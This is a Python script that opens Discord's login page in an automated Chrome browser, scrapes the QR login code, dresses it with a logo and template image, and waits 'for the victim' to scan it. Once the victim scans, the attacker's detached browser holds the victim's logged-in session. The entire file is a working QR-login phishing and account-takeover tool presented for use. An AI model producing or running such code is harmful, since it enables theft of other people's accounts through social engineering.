from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os
import requests
import json

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im1 = im1.convert("RGBA")
    im2 = im2.convert("RGBA")
    im2_w, im2_h = im2.size
    im1.paste(im2, (58, 58), im2)
    im1.save('temp/final_qr.png', quality=100)

def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1 = im1.convert("RGBA")
    im2 = im2.convert("RGBA")
    im1.paste(im2, (104, 306), im2)
    im1.save('QRCode.png', quality=100)

def main():
    try:
        os.remove("QRCode.png")
    except:
        pass

    try:
        os.remove("temp/final_qr.png")
    except:
        pass

    try:
        os.remove("temp/qr_code.png")
    except:
        pass

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

    driver.get('https://discord.com/login')
    time.sleep(5)

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = soup.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')

    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('Successfully generated the QR Code. Please check QRCode.png')
    print('Waiting for the victim to scan the QR code...')
    
    while True:
        if discord_login != driver.current_url:
            print("Done!")
            break

if __name__ == '__main__':
    main()
